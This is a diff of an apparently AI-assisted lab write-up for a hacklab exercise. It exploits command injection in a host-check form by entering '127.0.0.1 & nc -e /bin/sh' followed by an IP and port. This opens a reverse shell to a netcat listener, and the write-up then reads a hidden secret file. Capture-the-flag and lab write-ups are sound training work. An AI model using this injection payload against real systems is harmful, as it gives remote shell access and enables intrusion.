@@ -48,22 +48,22 @@
 > ![[Pasted image 20240502052455.png]]
 
 
-You're absolutely right, and I appreciate your patience. Let's correct that. Here's the revised callout:
+Understood. Here's the updated version:
 
 > [!exercise]+ Exercise 6
 > Go to `http://<Your Hacklab VM IP addr>:8083/doa.php` to get the secret!
 > 
-> **My Process:**
+> **Answer:**
 > 
-> Suspecting a command injection vulnerability, I navigated to the webpage allowing me to check if a host is dead or alive by entering an IP address.
+> Upon navigating to the webpage and seeing the form allowing me to check if a host is dead or alive by entering an IP address, I suspected a possible command injection vulnerability.
 > 
-> Before attempting to exploit the suspected vulnerability, I set up a netcat listener on my local machine using:
+> Before attempting to exploit the vulnerability, I set up a netcat listener on my local machine using:
 > 
 > ```
 > nc -lvp 1234
 > ```
 > 
-> With the listener in place, I crafted a malicious command instead of a regular IP address. I entered:
+> Crafting a malicious command, I entered:
 > 
 > ```
 > 127.0.0.1 & nc -e /bin/sh 192.168.117.124 1234
@@ -75,7 +75,13 @@ You're absolutely right, and I appreciate your patience. Let's correct that. Her
 > 
 > Upon successful exploitation of the vulnerability, I gained a reverse shell connection to the server.
 > 
-> Inside the reverse shell, I navigated the filesystem to locate the secret file. Discovering `.the_secret_file`, I used the `cat` command to reveal its contents:
+> Inside the reverse shell, I navigated the filesystem to locate the secret file. Initially, I used the `ls -a` command to list all files, including hidden ones, and discovered `.the_secret_file`.
+> 
+> ```
+> ls -a
+> ```
+> 
+> I then used the `cat` command to reveal its contents:
 > 
 > ```
 > cat .the_secret_file
@@ -94,11 +100,3 @@ You're absolutely right, and I appreciate your patience. Let's correct that. Her
 >                 ||     ||
 > ```
 > 
-> ![Pasted Image of the Exercise](ImageURL)
-> 
-> Always proceed with caution when exploiting command injection vulnerabilities and ensure proper input validation to prevent exploitation.
-
-
-
-
-
